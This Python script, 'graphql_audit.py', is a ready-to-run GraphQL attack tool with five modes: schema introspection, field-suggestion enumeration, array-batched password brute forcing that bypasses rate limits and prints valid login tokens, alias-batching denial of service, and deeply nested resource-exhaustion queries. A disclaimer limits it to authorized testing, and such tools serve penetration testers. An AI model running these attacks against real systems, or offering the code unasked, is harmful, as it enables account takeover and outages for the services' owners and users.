#!/usr/bin/env python3
"""
graphql_audit.py - GraphQL offensive auditor (2024-2026).

Performs the GraphQL attack workflow:
  introspect   full introspection query + parse types/queries/mutations
  suggest      field-suggestion / typo enumeration when introspection is disabled
  batch        array-batching brute force (single HTTP request, N login attempts)
  alias        alias-based batching DoS / rate-limit bypass (CVE-2024-50311 class)
  deep         deeply nested recursive query for resource-exhaustion DoS test

Dependency: pip install requests

Usage:
  python3 graphql_audit.py introspect https://t/graphql
  python3 graphql_audit.py suggest   https://t/graphql --type User --field usrname
  python3 graphql_audit.py batch     https://t/graphql --user admin --wordlist pw.txt
  python3 graphql_audit.py alias     https://t/graphql --count 1000 --field me
  python3 graphql_audit.py deep      https://t/graphql --depth 15

LEGAL: authorized testing only. The 'alias'/'deep' modes can cause DoS — run with
a low --count first and respect scope.
"""
import argparse
import json
import sys

try:
    import requests
except ImportError:
    requests = None

INTROSPECTION = """
query IntrospectionQuery {
  __schema {
    queryType { name } mutationType { name } subscriptionType { name }
    types {
      kind name description
      fields(includeDeprecated: true) {
        name args { name type { ...TypeRef } } type { ...TypeRef }
      }
      inputFields { name type { ...TypeRef } }
    }
  }
}
fragment TypeRef on __Type {
  kind name ofType { kind name ofType { kind name ofType { kind name } } }
}
"""


def _post(url, payload, headers, insecure, timeout=15):
    if requests is None:
        sys.exit("pip install requests required")
    h = {"Content-Type": "application/json"}
    for kv in headers or []:
        k, v = kv.split(":", 1); h[k.strip()] = v.strip()
    return requests.post(url, data=json.dumps(payload) if isinstance(payload, (dict, list)) else payload,
                         headers=h, verify=not insecure, timeout=timeout)


def cmd_introspect(args):
    r = _post(args.url, {"query": INTROSPECTION}, args.header, args.insecure)
    if r.status_code != 200:
        print(f"[!] status {r.status_code}; introspection may be disabled")
        print(r.text[:500]); return
    data = r.json()
    schema = data.get("data", {}).get("__schema")
    if not schema:
        print("[!] no __schema in response (introspection disabled?)"); print(r.text[:500]); return
    q = schema.get("queryType", {}).get("name")
    m = (schema.get("mutationType") or {}).get("name")
    print(f"[+] queryType={q} mutationType={m}")
    for t in schema.get("types", []):
        if t["name"].startswith("__"):
            continue
        if t.get("fields"):
            print(f"\ntype {t['name']} ({t['kind']})")
            for f in t["fields"]:
                a = ",".join(arg["name"] for arg in (f.get("args") or []))
                print(f"  {f['name']}({a})")


def cmd_suggest(args):
    # Field-suggestion exploitation: send an intentionally wrong field; GraphQL
    # returns "Did you mean ...". Works even when introspection is off.
    q = "{ %s { %s } }" % (args.type, args.field)
    r = _post(args.url, {"query": q}, args.header, args.insecure)
    print(f"[*] probe: {q}")
    try:
        errs = r.json().get("errors", [])
        for e in errs:
            print("  " + e.get("message", ""))
    except Exception:
        print(r.text[:500])


def cmd_batch(args):
    with open(args.wordlist) as f:
        pwds = [l.strip() for l in f if l.strip()]
    # Array batching: one HTTP request -> many login mutations -> rate-limit bypass
    batch = [{"query": 'mutation($u:String!,$p:String!){login(username:$u,password:$p){token}}',
              "variables": {"u": args.user, "p": pw}} for pw in pwds]
    r = _post(args.url, batch, args.header, args.insecure)
    print(f"[*] sent {len(batch)} login attempts in ONE request, status={r.status_code}")
    try:
        for pw, res in zip(pwds, r.json()):
            tok = (res.get("data") or {}).get("login", {})
            if tok and tok.get("token"):
                print(f"[+] VALID password={pw!r} token={tok['token'][:24]}...")
    except Exception:
        print(r.text[:500])


def cmd_alias(args):
    # Alias batching: one operation, N aliases -> bypass batching disable + DoS
    aliases = " ".join(f"a{i}: {args.field}" for i in range(args.count))
    q = "query { %s }" % aliases
    r = _post(args.url, {"query": q}, args.header, args.insecure)
    print(f"[*] {args.count} aliases in one query, status={r.status_code}, "
          f"resp_len={len(r.content)}, elapsed={r.elapsed.total_seconds():.2f}s")


def cmd_deep(args):
    # Recursive nested query for resource-exhaustion DoS (depth-limit test)
    inner = "id"
    for _ in range(args.depth):
        inner = f"{args.field} {{ {inner} }}"
    q = "query { %s }" % inner
    r = _post(args.url, {"query": q}, args.header, args.insecure)
    print(f"[*] depth={args.depth}, status={r.status_code}, elapsed={r.elapsed.total_seconds():.2f}s")
    if r.elapsed.total_seconds() > 5:
        print("[+] slow response -> likely no depth limiting (DoS vector)")


def main():
    ap = argparse.ArgumentParser(description="GraphQL offensive auditor (2024-2026)")
    sub = ap.add_subparsers(dest="cmd", required=True)
    for name in ("introspect", "suggest", "batch", "alias", "deep"):
        p = sub.add_parser(name)
        p.add_argument("url")
        p.add_argument("--header", action="append", help="Header: value (repeatable)")
        p.add_argument("--insecure", action="store_true")
        if name == "suggest":
            p.add_argument("--type", default="user"); p.add_argument("--field", default="usrname")
        if name == "batch":
            p.add_argument("--user", required=True); p.add_argument("--wordlist", required=True)
        if name == "alias":
            p.add_argument("--count", type=int, default=1000); p.add_argument("--field", default="__typename")
        if name == "deep":
            p.add_argument("--depth", type=int, default=15); p.add_argument("--field", required=True)
        p.set_defaults(fn=globals()[f"cmd_{name}"])
    args = ap.parse_args()
    args.fn(args)


if __name__ == "__main__":
    main()
